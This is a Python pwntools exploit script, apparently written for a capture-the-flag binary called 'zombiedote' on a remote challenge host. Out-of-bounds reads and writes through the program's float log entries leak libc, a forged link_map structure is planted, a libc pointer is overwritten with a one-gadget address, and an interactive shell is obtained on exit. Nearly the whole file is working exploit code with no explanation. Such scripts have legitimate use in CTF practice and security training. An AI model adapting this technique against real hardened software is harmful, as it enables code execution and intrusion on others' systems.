#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 94.237.56.175 --port 39900 zombiedote
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('zombiedote')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '94.237.56.124'
port = int(args.PORT or 49308)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
br exit
br system
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled
# RUNPATH:  b'./glibc'
import struct

def cmd(i):
    io.sendlineafter(b">> ",str(i).encode())

def prompt(m):
    io.sendlineafter(b": ",m)

def prompti(i):
    prompt(str(i).encode())

def create_log(n):
    cmd(1)
    prompti(n)

def insert(n,values):
    cmd(2)
    prompti(n)
    for i in range(n):
        log.info(str(values[i]))
        prompti(values[i])
        log.info(io.recvline())

def edit(idx,v):
    cmd(4)
    prompti(idx)
    prompti(v)

def inspect(idx):
    cmd(5)
    prompti(idx)
    io.recvuntil("(%): ")
    return float(io.recvline()[:-1])

def exit():
    cmd(3)

def b2d(m):
    return struct.unpack("<d",m)[0]

def d2b(d):
    return struct.pack("<d",d)

io = start()
create_log(0x100000 >> 3)
libc_offset = 0x104000 - 0x10
exit_entry_offset = 0x21abd8

stdout_offset = 0x219760

def arbr(offset):
    return unpack(d2b(inspect((libc_offset+offset)//8)),"all")

def arbw(offset,v):
    edit((libc_offset+offset)//8,b2d(p64(v)))

class link_map:
    def __init__(self,l_addr,l_init_called,array_ptr,array_idx_ptr,l_real=0):
        self.l_addr = l_addr
        self.l_init_called = l_init_called
        self.array_ptr = array_ptr
        self.array_idx_ptr = array_idx_ptr
        self.l_real = l_real

    def pack(self):
        p = [0 for i in range(0x91)]
        p[0] = libc.address
        p[2] = libc.address + 0x217bc0
        p[3] = 0 
        p[4] = 0x21a6e0
        p[5] = self.l_real
        p[8 + 26] = self.array_ptr
        p[8 + 28] = self.array_idx_ptr
        p[99] = (self.l_init_called &(0b1000)) << 32
        return p

# libc leak
libc = exe.libc
s = arbr(stdout_offset+0xd8) - libc.sym.__GI__IO_file_jumps
libc.address = s
l_addr = s + 0x21b000
chunk = s - libc_offset
dt_array_ptr = 0x228110
dt_arraysz_ptr = dt_array_ptr + 0x10
l_next_off = 0x228018
#arbw(dt_array_ptr,chunk)#libc.address+0xeeaa2)
#arbw(dt_arraysz_ptr,chunk+0x10)#libc.address+0xeeaa2)

log.info(hex(chunk+0x20-l_addr))
forged = link_map(chunk+0x18,0x0000401d,chunk+0x18,chunk+0x91*8,l_real=chunk).pack() + [0,8]
insert(len(forged),[b2d(p64(e,signed=e<0)) for e in forged])
arbw(l_next_off,chunk)
libc_bss_off = 0x21a6e0
arbw(libc_bss_off,libc.address+0xeea9c)
exit()
#log.info(hex(s))
io.interactive()

